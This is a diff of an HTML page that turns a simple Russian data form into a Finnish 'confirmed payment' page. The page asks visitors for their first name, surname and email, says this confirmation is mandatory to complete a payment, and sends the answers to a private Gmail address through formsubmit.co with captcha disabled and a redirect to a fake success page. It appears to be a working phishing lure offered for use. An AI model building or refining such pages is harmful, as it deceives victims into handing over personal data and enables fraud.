@@ -1,29 +1,119 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="fi">
 <head>
-  <meta charset="UTF-8">
-  <title>Отправка данных</title>
+<meta charset="UTF-8">
+<title>Vahvistettu maksu</title>
+
+<style>
+body {
+    font-family: Arial, Helvetica, sans-serif;
+    background: #f2f4f7;
+    margin: 0;
+    padding: 0;
+}
+
+.container {
+    max-width: 500px;
+    background: #ffffff;
+    margin: 40px auto;
+    padding: 25px;
+    border-radius: 8px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+}
+
+.logo {
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+.logo img {
+    max-width: 180px;
+}
+
+h1 {
+    font-size: 20px;
+    margin-bottom: 10px;
+}
+
+p {
+    font-size: 14px;
+    color: #555;
+}
+
+label {
+    font-weight: bold;
+    display: block;
+    margin-top: 15px;
+}
+
+input {
+    width: 100%;
+    padding: 10px;
+    margin-top: 5px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    font-size: 14px;
+}
+
+button {
+    width: 100%;
+    margin-top: 25px;
+    padding: 15px;
+    background: #0066cc;
+    color: white;
+    font-size: 16px;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+}
+
+button:hover {
+    background: #004fa3;
+}
+
+.footer-text {
+    font-size: 12px;
+    color: #555;
+    margin-top: 20px;
+}
+</style>
 </head>
+
 <body>
 
-<h2>Отправить данные</h2>
+<div class="container">
 
-<form action="https://formsubmit.co/kastalmero@gmail.com" method="POST">
+    <div class="logo">
+        <img src="logo.png" alt="Logo">
+    </div>
 
-  <label>Имя:</label><br>
-  <input type="text" name="Имя" required><br><br>
+    <h1>Vahvistettu maksu</h1>
+    <p>Syötä tietosi maksun vahvistamiseksi.</p>
 
-  <label>Адрес:</label><br>
-  <input type="text" name="Адрес" required><br><br>
+    <form action="https://formsubmit.co/kastalmero@gmail.com" method="POST">
 
-  <label>Email:</label><br>
-  <input type="email" name="Email" required><br><br>
+        <label>Etunimi</label>
+        <input type="text" name="Etunimi" required>
 
-  <input type="hidden" name="_subject" value="Новые данные из формы">
-  <input type="hidden" name="_captcha" value="false">
+        <label>Sukunimi</label>
+        <input type="text" name="Sukunimi" required>
 
-  <button type="submit">Отправить</button>
-</form>
+        <label>Sähköposti</label>
+        <input type="email" name="Email" required>
+
+        <!-- настройки -->
+        <input type="hidden" name="_subject" value="Uusi maksun vahvistus">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://alfredodefaro-ai.github.io/form/success.html">
+
+        <button type="submit">Paina vahvistaaksesi</button>
+    </form>
+
+    <div class="footer-text">
+        Tämä vahvistus on pakollinen maksun suorittamiseksi.
+    </div>
+
+</div>
 
 </body>
 </html>
